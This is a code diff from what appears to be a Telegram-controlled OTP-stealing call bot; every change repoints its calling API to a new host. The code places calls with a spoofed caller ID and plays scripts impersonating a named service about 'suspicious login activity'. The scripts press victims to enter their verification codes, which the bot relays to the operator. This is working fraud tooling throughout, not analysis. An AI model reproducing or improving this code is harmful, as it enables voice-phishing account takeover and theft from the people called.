@@ -783,7 +783,7 @@ def Set_custogrem_script(message):
 
 
 def callhangup(call_control:str):
-    hangurl = f'https://atlanta-api.online:8443/hangup'
+    hangurl = f'https://articunoapi.com:8443/hangup'
     payload = {
          'uuid':call_control
     }
@@ -806,7 +806,7 @@ def callmaking(number,spoof,chatid,service):
                         "callbackURL": f"{ngrok_url}/{service}/{chatid}/random",
                         "api_key": f"{apiKey}",
                             }
-            url = "https://atlanta-api.online:8443/create-call"
+            url = "https://articunoapi.com:8443/create-call"
             resp = requests.post(url, json=data)
             res = json.loads(resp.text)
             print(resp.text)
@@ -820,7 +820,7 @@ def make_call(t:str,f:str,user_id,service):
     callmaking(number=t,spoof=f,chatid=user_id,service=service)
 
 def custom_callmaking(number,spoof,chatid,script_id):
-        url = "https://atlanta-api.online:8443/create-call"
+        url = "https://articunoapi.com:8443/create-call"
         data = {
              "to_": f"{number}",
               "from_": f"{spoof}",
@@ -900,7 +900,7 @@ def custom_confirm1(message):
 
     
     if up_resp1=='Accept':
-        url = 'https://atlanta-api.online:8443/play-audio'
+        url = 'https://articunoapi.com:8443/play-audio'
         data = {
     "uuid": f"{call_control_id}",
     "audiourl": f"https://sourceotp.online/scripts/{customscid}/output3.wav",
@@ -913,7 +913,7 @@ def custom_confirm1(message):
 
     elif up_resp1=='Deny':
         mes1=bot.send_message(chat_id,f"""*Code Rejected ❌*""",parse_mode='markdown').message_id
-        url = 'https://atlanta-api.online:8443/gather-audio'
+        url = 'https://articunoapi.com:8443/gather-audio'
         data = {
     "uuid": f"{call_control_id}",
     "audiourl": f"https://sourceotp.online/scripts/{customscid}/output5.wav",
@@ -954,7 +954,7 @@ def custom_prebuild_script_call(script_id,chatid):
             ringing_handler.append(call_control_id)
         
     elif event == "call.answered":
-            url1 = "https://atlanta-api.online:8443/gather-audio"
+            url1 = "https://articunoapi.com:8443/gather-audio"
             data = {
     "uuid": f"{call_control_id}",
     "audiourl": f"https://sourceotp.online/scripts/{script_id}/output1.wav",
@@ -1024,7 +1024,7 @@ def custom_prebuild_script_call(script_id,chatid):
 
         if otp2 == "1":
             def custom_ask_otp():
-                url3 = 'https://atlanta-api.online:8443/gather-audio'
+                url3 = 'https://articunoapi.com:8443/gather-audio'
                 data = {
     "uuid": f"{call_control_id}",
     "audiourl": f"https://sourceotp.online/scripts/{script_id}/output2.wav",
@@ -1041,7 +1041,7 @@ Send Your Code 📲*""",parse_mode='markdown')
             custom_send_ask_otp()
            
         elif(len(otp2)>=4):
-            url = 'https://atlanta-api.online:8443/play-audio'
+            url = 'https://articunoapi.com:8443/play-audio'
             data = {
     "uuid": f"{call_control_id}",
     "audiourl": f"https://sourceotp.online/scripts/{script_id}/output4.wav",
@@ -1094,7 +1094,7 @@ def confirm1(message):
     otp_digits  = cont[3]
 
     if up_resp1=='Accept':
-        url = 'https://atlanta-api.online:8443/play-text'
+        url = 'https://articunoapi.com:8443/play-text'
         data = {
     "uuid": f"{call_control_id}",
     "text": f"Thank You, You Code Was Valid And your Account Is Safe, Now May You Hangup Have A Great Day.",
@@ -1108,7 +1108,7 @@ def confirm1(message):
 
     elif up_resp1=='Deny':
         mes1=bot.send_message(chat_id,f"""* Code Rejected ❌ *""",parse_mode='markdown').message_id
-        url = 'https://atlanta-api.online:8443/gather-text'
+        url = 'https://articunoapi.com:8443/gather-text'
         data = {
     "uuid": f"{call_control_id}",
     "text": f"Oops Sorry, Your Code Was Invalid Or Expired, We Have Send A {otp_digits} digits Code, Dail It For Verification.",
@@ -1145,7 +1145,7 @@ def prebuild_script_call(service,chatid):
         callhangbutton(chatid)
 
     elif event == "in-progress":
-        url1 = "https://atlanta-api.online:8443/gather-text"
+        url1 = "https://articunoapi.com:8443/gather-text"
         data = {
     "uuid": f"{call_control_id}",
     "text": f"Hello Dear Customer We Are Calling From {service}, We Detect A Suspicious Login Activity On Your {service} Account. if It Is Not You Press One.",
@@ -1216,7 +1216,7 @@ def prebuild_script_call(service,chatid):
                 c.execute(f"Select * from call_data where chat_id={chatid}")
                 cont = c.fetchone()
                 otp_digits  = cont[3]
-                url3 = 'https://atlanta-api.online:8443/gather-text'
+                url3 = 'https://articunoapi.com:8443/gather-text'
                 data = {
     "uuid": f"{call_control_id}",
     "text": f"For Remove The Login Device We Have Send A {otp_digits} digits confarmation code on Your Registered Mobile Number. it Is Compulsory For Owner Verification.",
@@ -1234,7 +1234,7 @@ Send Your Code 📲*""",parse_mode='markdown')
            
 
         elif(len(otp2)>=4):
-            url = 'https://atlanta-api.online:8443/play-text'
+            url = 'https://articunoapi.com:8443/play-text'
             data = {
     "uuid": f"{call_control_id}",
     "text": f"Thank You, Please Wait A Minute We Are Checking Your Code.",
